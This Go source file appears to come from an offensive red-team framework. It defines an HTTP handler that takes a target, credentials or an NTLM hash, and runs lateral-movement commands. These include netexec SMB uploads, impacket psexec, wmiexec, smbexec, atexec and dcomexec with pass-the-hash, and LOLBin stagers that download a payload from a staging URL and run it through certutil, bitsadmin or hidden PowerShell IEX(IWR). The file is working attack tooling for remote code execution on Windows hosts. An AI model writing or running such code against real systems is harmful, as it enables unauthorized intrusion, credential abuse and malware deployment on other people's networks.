package server

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

type stagerRunReq struct {
	Action string `json:"action"` // "upload" | "exec" | "upload-exec"
	Method string `json:"method"`
	Target string `json:"target"`
	Domain string `json:"domain"`
	User   string `json:"user"`
	Pass   string `json:"pass"`
	Hash   string `json:"hash"`
	LBin   string `json:"lbin"`  // local path on Kali (SMB upload methods)
	RPath  string `json:"rpath"` // remote Windows path
	SURL   string `json:"surl"`  // staging URL (LOLBin download methods)
}

func (s *Server) apiStagerRun(w http.ResponseWriter, r *http.Request) {
	var req stagerRunReq
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonErr(w, "bad json: "+err.Error(), http.StatusBadRequest)
		return
	}
	if req.Target == "" || req.User == "" {
		jsonErr(w, "target and user are required", http.StatusBadRequest)
		return
	}
	if req.Action == "" {
		req.Action = "upload-exec"
	}

	useHash := req.Hash != ""
	domPfx := ""
	if req.Domain != "" {
		domPfx = req.Domain + "/"
	}

	// C:\Windows\Temp\svc.exe → \Windows\Temp\svc.exe  (for C$ share)
	rUnc := req.RPath
	if len(rUnc) >= 2 && rUnc[1] == ':' {
		rUnc = rUnc[2:]
	}

	impktIdent := func() string {
		if useHash {
			return fmt.Sprintf("%s%s@%s", domPfx, req.User, req.Target)
		}
		return fmt.Sprintf("%s%s:%s@%s", domPfx, req.User, req.Pass, req.Target)
	}
	hashArgs := func() []string {
		if useHash {
			return []string{"-hashes", ":" + req.Hash}
		}
		return nil
	}
	nxeAuthArgs := func() []string {
		args := []string{"-u", req.User}
		if useHash {
			args = append(args, "-H", req.Hash)
		} else {
			args = append(args, "-p", req.Pass)
		}
		if req.Domain != "" {
			args = append(args, "-d", req.Domain)
		}
		return args
	}

	// Resolve lbin to absolute path: frontend sends "bin/payloads/file.exe"
	// but server cwd may be bin/, so we anchor to projectRoot.
	lbinAbs := req.LBin
	if lbinAbs != "" && !filepath.IsAbs(lbinAbs) {
		lbinAbs = filepath.Join(projectRoot(), lbinAbs)
	}

	// Upload via netexec --put-file (works with both pass and hash; no impacket-smbclient quirks)
	// Remote path must be without drive letter (relative to C$ share), e.g. \Windows\Temp\file.exe
	smbUpload := func() []string {
		args := append([]string{"netexec", "smb", req.Target}, nxeAuthArgs()...)
		args = append(args, "--put-file", lbinAbs, rUnc)
		return args
	}
	impktExec := func(tool string) []string {
		args := []string{tool, impktIdent()}
		args = append(args, hashArgs()...)
		args = append(args, req.RPath)
		return args
	}

	var cmds [][]string

	switch req.Method {
	case "smb-wmi", "smb-atexec", "smb-dcom":
		execTool := map[string]string{
			"smb-wmi":    "impacket-wmiexec",
			"smb-atexec": "impacket-atexec",
			"smb-dcom":   "impacket-dcomexec",
		}[req.Method]
		if req.Action == "upload" || req.Action == "upload-exec" {
			cmds = append(cmds, smbUpload())
		}
		if req.Action == "exec" || req.Action == "upload-exec" {
			cmds = append(cmds, impktExec(execTool))
		}

	case "psexec":
		args := []string{"impacket-psexec", impktIdent()}
		args = append(args, hashArgs()...)
		args = append(args, "cmd.exe")
		cmds = append(cmds, args)

	case "smbexec":
		args := []string{"impacket-smbexec", impktIdent()}
		args = append(args, hashArgs()...)
		cmds = append(cmds, args)

	case "nxe":
		base := append([]string{"netexec", "smb", req.Target}, nxeAuthArgs()...)
		if req.Action == "upload" || req.Action == "upload-exec" {
			up := append(append([]string{}, base...), "--put-file", req.LBin, req.RPath)
			cmds = append(cmds, up)
		}
		if req.Action == "exec" || req.Action == "upload-exec" {
			ex := append(append([]string{}, base...), "-x", req.RPath)
			cmds = append(cmds, ex)
		}

	// LOLBin methods — download from staging URL and execute via wmiexec/netexec
	case "lol-certutil":
		if req.SURL == "" || req.RPath == "" {
			jsonErr(w, "staging URL and remote path required", http.StatusBadRequest)
			return
		}
		cmd := fmt.Sprintf("cmd.exe /c certutil -urlcache -split -f %s %s && %s", req.SURL, req.RPath, req.RPath)
		args := []string{"impacket-wmiexec", impktIdent()}
		args = append(args, hashArgs()...)
		args = append(args, cmd)
		cmds = append(cmds, args)

	case "lol-bitsadmin":
		if req.SURL == "" || req.RPath == "" {
			jsonErr(w, "staging URL and remote path required", http.StatusBadRequest)
			return
		}
		cmd := fmt.Sprintf("cmd.exe /c bitsadmin /transfer J /download /priority normal %s %s && %s", req.SURL, req.RPath, req.RPath)
		args := []string{"impacket-wmiexec", impktIdent()}
		args = append(args, hashArgs()...)
		args = append(args, cmd)
		cmds = append(cmds, args)

	case "lol-iex":
		if req.SURL == "" {
			jsonErr(w, "staging URL required", http.StatusBadRequest)
			return
		}
		cmd := fmt.Sprintf("powershell -nop -w hidden -c \"IEX(IWR '%s' -UseBasicParsing)\"", req.SURL)
		args := []string{"impacket-wmiexec", impktIdent()}
		args = append(args, hashArgs()...)
		args = append(args, cmd)
		cmds = append(cmds, args)

	case "nxe-iex":
		if req.SURL == "" {
			jsonErr(w, "staging URL required", http.StatusBadRequest)
			return
		}
		cmd := fmt.Sprintf("powershell -nop -w hidden -c \"IEX(IWR '%s' -UseBasicParsing)\"", req.SURL)
		args := append([]string{"netexec", "smb", req.Target}, nxeAuthArgs()...)
		args = append(args, "-x", cmd)
		cmds = append(cmds, args)

	default:
		jsonErr(w, "unknown method: "+req.Method, http.StatusBadRequest)
		return
	}

	ctx, cancel := context.WithTimeout(r.Context(), 5*time.Minute)
	defer cancel()

	var out strings.Builder
	exitCode := 0

	for _, args := range cmds {
		out.WriteString(fmt.Sprintf("$ %s\n", strings.Join(args, " ")))
		cmd := exec.CommandContext(ctx, args[0], args[1:]...)
		combined, err := cmd.CombinedOutput()
		out.Write(combined)
		out.WriteByte('\n')
		if err != nil {
			if ee, ok := err.(*exec.ExitError); ok {
				exitCode = ee.ExitCode()
			} else {
				out.WriteString("[error] " + err.Error() + "\n")
				exitCode = 1
			}
		}
	}

	BroadcastGUI("LOG", "", fmt.Sprintf("stager run: method=%s action=%s target=%s exit=%d",
		req.Method, req.Action, req.Target, exitCode))

	jsonOK(w, map[string]any{
		"output":    out.String(),
		"exit_code": exitCode,
	})
}
